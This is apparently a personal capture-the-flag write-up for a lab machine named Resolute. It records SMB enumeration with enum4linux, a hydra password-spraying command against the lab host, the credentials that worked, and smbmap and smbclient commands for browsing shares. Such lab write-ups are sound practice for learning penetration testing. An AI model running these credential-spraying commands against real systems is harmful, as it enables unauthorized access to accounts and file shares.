# Resolute
## Enumeration

enum4linux gave us some interesting things:
	- Some users
	- A password for marko : Welcome123!

I tried to connect as marko with the password and it was a fail 

So i decide to try with hydra to try every user with the password.
	```bash 
	hydra -L names.txt -P password.txt 10.10.10.169 smb
	```

[445][smb] host: 10.10.10.169   login: melanie   password: Welcome123!

so i can connect and enum as melanie with smbclient - smbmap
	
	```bash
	smbmap -u melanie -H 10.10.10.169 -p Welcome123!
	smbclient //10.10.10.169/SYSVOL -U melanie -p
	```
